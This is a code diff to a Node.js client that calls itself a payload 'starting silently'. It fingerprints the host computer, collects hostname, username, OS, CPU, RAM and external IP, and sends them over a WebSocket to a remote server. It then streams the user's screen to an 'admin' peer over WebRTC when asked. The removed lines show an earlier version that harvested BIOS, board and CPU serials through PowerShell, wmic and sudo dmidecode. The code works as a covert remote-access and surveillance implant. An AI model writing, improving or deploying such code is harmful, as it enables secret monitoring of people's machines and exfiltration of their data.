@@ -41,86 +41,47 @@ function logError(msg, err) {
 
 log("[INIT] Payload starting silently...");
 
+// --- DEVICE INFO FUNCTION (Native & Fast) ---
+function getDeviceInfo() {
+    let username = 'Unknown';
+    try {
+        username = os.userInfo().username;
+    } catch (_) {}
+
+    const cpu = os.cpus();
+
+    return {
+        hostname: os.hostname(),
+        platform: os.platform(),
+        release: os.release(),
+        architecture: os.arch(),
+        username: username,
+        cpuModel: cpu[0]?.model || 'Unknown',
+        cpuCores: cpu.length,
+        ramGB: Number((os.totalmem() / 1024 ** 3).toFixed(2)),
+        freeRamGB: Number((os.freemem() / 1024 ** 3).toFixed(2)),
+        uptimeSeconds: os.uptime()
+    };
+}
+
 // --- HARDWARE FINGERPRINT ---
 function getHardwareFingerprint() {
     const mac = getMacAddress();
-    const cpuSerial = getCpuSerial();
-    const boardSerial = getBoardSerial();
-    // Create a unique hash for this machine
-    return crypto.createHash('sha256').update(mac + cpuSerial + boardSerial).digest('hex').substr(0, 12);
+    const deviceInfo = getDeviceInfo();
+    // Use MAC + CPU Model + Username for a stable ID
+    return crypto.createHash('sha256').update(mac + deviceInfo.cpuModel + deviceInfo.username).digest('hex').substr(0, 12);
 }
 
 function getMacAddress() {
-    log("[MAC] Attempting to get MAC address...");
     const interfaces = os.networkInterfaces();
     for (const name of Object.keys(interfaces)) {
         for (const iface of interfaces[name]) {
             if (iface.family === 'IPv4' && !iface.internal) {
-                log("[MAC] Found MAC: " + iface.mac);
                 return iface.mac;
             }
         }
     }
-    log("[MAC] No MAC found, returning default.");
     return '00:00:00:00:00:00';
-}
-
-function getCpuSerial() {
-    log("[CPU] Attempting to get CPU serial...");
-    try { 
-        // Windows
-        log("[CPU] Trying Windows wmic...");
-        const result = execSync('wmic cpu get processorid').toString();
-        const lines = result.split('\n');
-        if (lines.length > 1) {
-            const serial = lines[1].trim();
-            log("[CPU] Windows CPU Serial: " + serial);
-            return serial;
-        } else {
-            throw new Error("Empty response");
-        }
-    } catch (e) {
-        logError("[CPU] Windows wmic failed, trying Linux...", e);
-        try { 
-            // Linux
-            log("[CPU] Trying Linux cat /proc/cpuinfo...");
-            const result = execSync("cat /proc/cpuinfo | grep 'serial number' | awk '{print $3}'").toString();
-            const serial = result.trim();
-            log("[CPU] Linux CPU Serial: " + serial);
-            return serial;
-        } catch (e2) { 
-            logError("[CPU] Linux also failed", e2);
-            return 'unknown_cpu'; 
-        } }
-}
-
-function getBoardSerial() {
-    log("[BOARD] Attempting to get Board Serial...");
-    try { 
-        // Windows
-        log("[BOARD] Trying Windows wmic baseboard...");
-        const result = execSync('wmic baseboard get serialnumber').toString();
-        const lines = result.split('\n');
-        if (lines.length > 1) {
-            const serial = lines[1].trim();
-            log("[BOARD] Windows Board Serial: " + serial);
-            return serial;
-        } else {
-            throw new Error("Empty response");
-        }
-    } catch (e) {
-        logError("[BOARD] Windows wmic failed, trying Linux...", e);
-        try { 
-            // Linux
-            log("[BOARD] Trying Linux dmidecode...");
-            const result = execSync("sudo dmidecode -t system | grep 'Serial Number' | awk '{print $3}'").toString();
-            const serial = result.trim();
-            log("[BOARD] Linux Board Serial: " + serial);
-            return serial;
-        } catch (e2) { 
-            logError("[BOARD] Linux also failed", e2);
-            return 'unknown_board'; 
-        } }
 }
 
 // --- ID MANAGEMENT ---
@@ -191,293 +152,48 @@ async function initConnection() {
         isConnected = true;
         log(`[WS] Connected. Sending identity...`);
         
-        // Get Real OS Name and Device Details
-        let realOsName = '';
-        let realUser = '';
-        let realDeviceName = os.hostname() || 'Unknown';
-        let realManufacturer = '';
-        let realModel = '';
-        let realSerialNumber = '';
-        let realCpu = '';
-
-        const commandOptions = {
-            encoding: 'utf8',
-            timeout: 10000, // Increased timeout to 10s
-            stdio: ['ignore', 'pipe', 'ignore']
-        };
-
-        // --- CRITICAL FIX: DETECT USER'S OS VIA POWERSHELL ---
-        // This ensures we get the User's Windows info, not Render's Linux info
+        // Get Device Info using the fast native function
+        const deviceInfo = getDeviceInfo();
         
-        if (process.platform === 'win32') {
-            log("[OS] Platform detected: Windows");
-            
-            // Windows OS details
-            try {
-                log("[OS] Getting Windows OS name...");
-                realOsName = execSync(
-                    'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_OperatingSystem).Caption"',
-                    commandOptions
-                ).trim();
-                log("[OS] Windows OS Name: " + realOsName);
-            } catch (e) {
-                logError("[OS] Error getting Windows OS name", e);
-            }
-
-            if (!realOsName) {
-                realOsName = 'Windows ' + os.release();
-            }
-
-            // Windows manufacturer
-            try {
-                log("[OS] Getting Windows Manufacturer...");
-                realManufacturer = execSync(
-                    'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).Manufacturer"',
-                    commandOptions
-                ).trim();
-                log("[OS] Windows Manufacturer: " + realManufacturer);
-            } catch (e) {
-                logError("[OS] Error getting Windows Manufacturer", e);
-            }
-
-            // Windows device model
-            try {
-                log("[OS] Getting Windows Model...");
-                realModel = execSync(
-                    'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).Model"',
-                    commandOptions
-                ).trim();
-                log("[OS] Windows Model: " + realModel);
-            } catch (e) {
-                logError("[OS] Error getting Windows Model", e);
-            }
-
-            // Actual BIOS hardware serial number
-            try {
-                log("[OS] Getting Windows Serial...");
-                realSerialNumber = execSync(
-                    'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_BIOS).SerialNumber"',
-                    commandOptions
-                ).trim();
-                log("[OS] Windows Serial: " + realSerialNumber);
-            } catch (e) {
-                logError("[OS] Error getting Windows Serial", e);
-            }
-
-            // Actual CPU model
-            try {
-                log("[OS] Getting Windows CPU...");
-                realCpu = execSync(
-                    'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_Processor | Select-Object -First 1).Name"',
-                    commandOptions
-                ).trim();
-                log("[OS] Windows CPU: " + realCpu);
-            } catch (e) {
-                logError("[OS] Error getting Windows CPU", e);
-            }
-
-            // Get logged-in Windows desktop user (REAL USER NAME)
-            try {
-                log("[OS] Getting Windows User...");
-                realUser = execSync(
-                    'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).UserName"',
-                    commandOptions
-                ).trim();
-                log("[OS] Windows User: " + realUser);
-            } catch (e) {
-                logError("[OS] Error getting Windows User", e);
-            }
-
-            if (!realUser) {
-                try {
-                    log("[OS] Fallback to whoami...");
-                    realUser = execSync('whoami', commandOptions).trim();
-                    log("[OS] Fallback User: " + realUser);
-                } catch (e) {
-                    realUser = os.userInfo().username || 'user';
-                }
-            }
-
-        } else if (process.platform === 'darwin') {
-
-            log("[OS] Platform detected: macOS");
-
-            // macOS OS details
-            try {
-                const macName = execSync('sw_vers -productName', commandOptions).trim();
-                const macVersion = execSync('sw_vers -productVersion', commandOptions).trim();
-                realOsName = [macName, macVersion].filter(Boolean).join(' ');
-                log("[OS] macOS Version: " + realOsName);
-            } catch (e) {
-                logError("[OS] Error getting macOS details", e);
-            }
-
-            if (!realOsName) {
-                realOsName = 'macOS ' + os.release();
-            }
-
-            realManufacturer = 'Apple';
-
-            // Mac hardware model
-            try {
-                log("[OS] Getting Mac Model...");
-                realModel = execSync('sysctl -n hw.model', commandOptions).trim();
-                log("[OS] Mac Model: " + realModel);
-            } catch (e) {
-                logError("[OS] Error getting Mac Model", e);
-            }
-
-            // Mac hardware serial
-            try {
-                log("[OS] Getting Mac Serial...");
-                realSerialNumber = execSync(
-                    "system_profiler SPHardwareDataType | awk -F': ' '/Serial Number/ {print $2; exit}'",
-                    commandOptions
-                ).trim();
-                log("[OS] Mac Serial: " + realSerialNumber);
-            } catch (e) {
-                logError("[OS] Error getting Mac Serial", e);
-            }
-
-            // CPU model
-            try {
-                log("[OS] Getting Mac CPU...");
-                realCpu = execSync('sysctl -n machdep.cpu.brand_string', commandOptions).trim();
-                log("[OS] Mac CPU: " + realCpu);
-            } catch (e) {
-                logError("[OS] Error getting Mac CPU", e);
-                realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
-            }
-
-            try {
-                log("[OS] Getting Mac User...");
-                realUser = execSync('whoami', commandOptions).trim();
-                log("[OS] Mac User: " + realUser);
-            } catch (e) {
-                realUser = os.userInfo().username || 'user';
-            }
-
-        } else if (process.platform === 'linux') {
-
-            log("[OS] Platform detected: Linux");
-
-            // Linux distribution details
-            try {
-                log("[OS] Getting Linux Distro...");
-                realOsName = execSync(
-                    "grep '^PRETTY_NAME=' /etc/os-release | cut -d= -f2- | tr -d '\"'",
-                    commandOptions
-                ).trim();
-                log("[OS] Linux Distro: " + realOsName);
-            } catch (e) {
-                logError("[OS] Error getting Linux distro", e);
-            }
-
-            if (!realOsName) {
-                realOsName = 'Linux ' + os.release();
-            }
-
-            // Linux manufacturer
-            try {
-                log("[OS] Getting Linux Manufacturer...");
-                realManufacturer = execSync(
-                    'cat /sys/class/dmi/id/sys_vendor',
-                    commandOptions
-                ).trim();
-                log("[OS] Linux Manufacturer: " + realManufacturer);
-            } catch (e) {
-                logError("[OS] Error getting Linux Manufacturer", e);
-            }
-
-            // Linux hardware model
-            try {
-                log("[OS] Getting Linux Model...");
-                realModel = execSync(
-                    'cat /sys/class/dmi/id/product_name',
-                    commandOptions
-                ).trim();
-                log("[OS] Linux Model: " + realModel);
-            } catch (e) {
-                logError("[OS] Error getting Linux Model", e);
-            }
-
-            // Linux hardware serial (may require elevated permissions)
-            try {
-                log("[OS] Getting Linux Serial...");
-                realSerialNumber = execSync(
-                    'cat /sys/class/dmi/id/product_serial',
-                    commandOptions
-                ).trim();
-                log("[OS] Linux Serial: " + realSerialNumber);
-            } catch (e) {
-                logError("[OS] Error getting Linux Serial", e);
-            }
-
-            // Linux CPU model
-            realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
-
-            try {
-                log("[OS] Getting Linux User...");
-                realUser = execSync('whoami', commandOptions).trim();
-                log("[OS] Linux User: " + realUser);
-            } catch (e) {
-                realUser = os.userInfo().username || 'user';
-            }
-
-        } else {
-
-            realOsName = process.platform + ' ' + os.release();
-            realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
-
-            try {
-                realUser = os.userInfo().username || 'user';
-            } catch (e) {
-                realUser = 'user';
-            }
-        }
-
-        // Final hardware and system information
-        const realRamGB = Number(
-            (os.totalmem() / (1024 * 1024 * 1024)).toFixed(2)
-        );
-
-        const realCpuCores = os.cpus().length;
-
-        
-        // Get External IP from the connected guest
+        // Get External IP
         myIp = await getExternalIP();
 
-        // Get actual guest computer name
-        realDeviceName = os.hostname() || 'Unknown';
-
-        // Send actual guest device information
-        // IMPORTANT: These keys MUST match the database columns exactly
-        safeSend(JSON.stringify({
+        // Prepare Data
+        const payloadData = {
             type: 'info',
             id: myId,
             uniqueId: myId,
-            fingerprint: myId, // This is the key identifier
-            os: realOsName,
-            arch: os.arch(),
-            user: realDeviceName,
+            fingerprint: myId,
+            os: deviceInfo.platform + ' ' + deviceInfo.release, 
+            arch: deviceInfo.architecture,
+            user: deviceInfo.username,
             ip: myIp,
             last_seen: Date.now(),
             status: 'Online',
-            serial_number: realSerialNumber || realModel || myId
-        }));
+            serial_number: deviceInfo.hostname 
+        };
 
+        log("[WS] Sending Identity Payload:", JSON.stringify(payloadData));
+        
+        // Send the payload
+        safeSend(JSON.stringify(payloadData));
+        
+        log("[WS] Identity sent. Starting monitoring...");
         startMonitoring();
     });
-
-
 
     ws.on('message', (msg) => {
         try {
             const data = JSON.parse(msg);
+            log("[WS] Received Message Type:", data.type);
+            
             if (data.type === 'request_join') handleJoinRequest();
             else if (data.type === 'offer') handleOffer(data.sdp);
             else if (data.type === 'answer') handleAnswer(data.sdp);
             else if (data.type === 'candidate') handleCandidate(data.candidate);
+            else if (data.type === 'notification') {
+                log("[WS] Admin Notification:", data.message);
+            }
         } catch (e) {
             logError("[WS] Message parse error", e);
         }
@@ -494,15 +210,17 @@ async function initConnection() {
 function safeSend(msg) {
     if (ws && ws.readyState === WebSocket.OPEN) {
         ws.send(msg);
-        log("[WS] Message sent successfully.");
+        log("[WS] Message Sent Successfully.");
     } else {
-        log("[WS] Warning: Socket not open, message not sent.");
+        log("[WS] Warning: Socket not open, cannot send.");
     }
 }
 
 function startMonitoring() {
     setInterval(() => {
-        if (isConnected) safeSend(JSON.stringify({ type: 'heartbeat' }));
+        if (isConnected) {
+            safeSend(JSON.stringify({ type: 'heartbeat' }));
+        }
     }, 30000);
 }
 
@@ -511,6 +229,7 @@ let peerConnection = null;
 let localStream = null;
 
 async function captureScreenPureJS() {
+    log("[WEBRTC] Initializing Screen Capture...");
     if (!peerConnection) {
         peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
     }
@@ -521,17 +240,21 @@ async function captureScreenPureJS() {
     });
 
     try {
-        // Force screen share over camera if possible
+        log("[WEBRTC] Requesting Display Media...");
         const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
         stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));
 
         peerConnection.onicecandidate = (event) => {
-            if (event.candidate) safeSend(JSON.stringify({ type: 'candidate', targetId: 'admin', candidate: event.candidate }));
+            if (event.candidate) {
+                safeSend(JSON.stringify({ type: 'candidate', targetId: 'admin', candidate: event.candidate }));
+            }
         };
 
+        log("[WEBRTC] Creating Offer...");
         const offer = await peerConnection.createOffer();
         await peerConnection.setLocalDescription(offer);
         safeSend(JSON.stringify({ type: 'offer', targetId: 'admin', sdp: peerConnection.localDescription }));
+        log("[WEBRTC] Screen Share Started Successfully.");
     } catch (err) {
         logError("[WEBRTC] Screen capture error", err);
     }
@@ -543,6 +266,7 @@ function handleJoinRequest() {
 }
 
 function handleOffer(offerSDP) {
+    log("[WEBRTC] Handling Offer from Admin...");
     if (!peerConnection) peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
     peerConnection.setRemoteDescription(new RTCSessionDescription(offerSDP))
         .then(() => peerConnection.createAnswer())
@@ -552,14 +276,16 @@ function handleOffer(offerSDP) {
 }
 
 function handleAnswer(answerSDP) {
+    log("[WEBRTC] Handling Answer from Admin...");
     if (peerConnection) peerConnection.setRemoteDescription(new RTCSessionDescription(answerSDP)).catch(err => logError("[WEBRTC] Error handling answer", err));
 }
 
 function handleCandidate(candidate) {
+    log("[WEBRTC] Handling ICE Candidate...");
     if (peerConnection && candidate) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => logError("[WEBRTC] Candidate error", err));
 }
 
-// --- HTTP PORT LISTENER (For Render Health) ---
+// --- HTTP PORT LISTENER (For Render/Vercel Health) ---
 const PORT = Number(process.env.PORT) || 3000;
 const server = http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -568,9 +294,8 @@ const server = http.createServer((req, res) => {
 
 server.listen(PORT, '0.0.0.0', () => {
     log(`[RENDER] HTTP server listening on 0.0.0.0:${PORT}`);
-    log('[RENDER] Health service running. Guest registration disabled.');
+    log('[RENDER] Health service running.');
 });
 
 // --- INITIALIZATION ---
-// Initialize connection on the Guest Computer, not inside Render
 initConnection();
